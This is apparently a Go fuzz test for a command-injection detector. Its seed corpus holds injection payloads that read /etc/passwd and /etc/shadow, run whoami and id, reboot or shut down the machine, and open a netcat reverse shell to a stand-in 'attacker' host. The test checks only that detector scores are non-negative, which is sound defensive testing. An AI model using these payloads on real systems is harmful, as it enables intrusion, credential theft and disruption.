package cmdi

import "testing"

func FuzzCMDiDetector(f *testing.F) {
	f.Add("127.0.0.1;cat /etc/passwd")
	f.Add("1 && cat /etc/shadow")
	f.Add("`whoami`")
	f.Add("$(id)")
	f.Add("1\nreboot")
	f.Add("x\rshutdown -h")
	f.Add("normal input")
	f.Add("")
	f.Add("| nc -e /bin/sh attacker 4444")
	f.Add("example.com")
	f.Add(";;;|||&&&")
	f.Add(string([]byte{0, 1, 2, 255, 254}))

	f.Fuzz(func(t *testing.T, input string) {
		findings := Detect(input, "query")
		for _, fd := range findings {
			if fd.Score < 0 {
				t.Errorf("negative score for input %q: %d", input, fd.Score)
			}
		}
	})
}
